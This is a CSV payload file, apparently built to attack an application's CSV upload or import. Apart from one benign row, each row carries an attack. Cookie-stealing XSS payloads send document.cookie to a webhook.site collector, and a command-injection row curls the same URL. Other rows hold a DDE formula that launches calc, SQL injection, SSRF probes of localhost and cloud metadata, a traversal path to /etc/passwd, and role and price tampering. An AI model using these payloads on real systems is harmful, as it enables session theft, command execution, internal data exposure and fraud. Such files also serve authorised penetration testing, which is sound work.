name,email,url,comment,callback_url,role,user_id,price,file_path
Normal User,user@example.com,http://example.com,Hello world,https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,user,1001,10,/uploads/file.csv
XSS Test,[email],https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,<script>fetch('https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8?xss='+document.cookie)</script>,https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,user,1002,10,/uploads/xss.csv
IMG XSS,[email],https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,"""'><img src=x onerror=fetch('https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8?img='+document.cookie)>",https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,user,1003,10,/uploads/xss2.csv
CSV Injection,[email],https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,"=HYPERLINK(""https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8"")",https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,user,1004,10,/uploads/csv.csv
CMD Injection,[email],https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,=cmd|' /C calc'!A0,https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,user,1005,10,/uploads/cmd.csv
SSRF Local,[email],http://127.0.0.1,test,https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,user,1006,10,/uploads/ssrf.csv
SSRF Metadata,[email],http://169.254.169.254/latest/meta-data/,test,https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,user,1007,10,/uploads/ssrf2.csv
Admin Inject,[email],https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,test,https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,admin,1,100000,/uploads/admin.csv
SQLi Test,[email],https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,' OR 1=1--,https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,user,1008,10,/uploads/sqli.csv
CMD Test,[email],https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,test;curl https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,user,1009,10,/uploads/cmd2.csv
Traversal,[email],https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,test,https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,user,1010,10,../../../../etc/passwd
Free Product,[email],https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,test,https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,user,1011,0,/uploads/free.csv
Negative Quantity,[email],https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,test,https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,user,1012,-10,/uploads/neg.csv
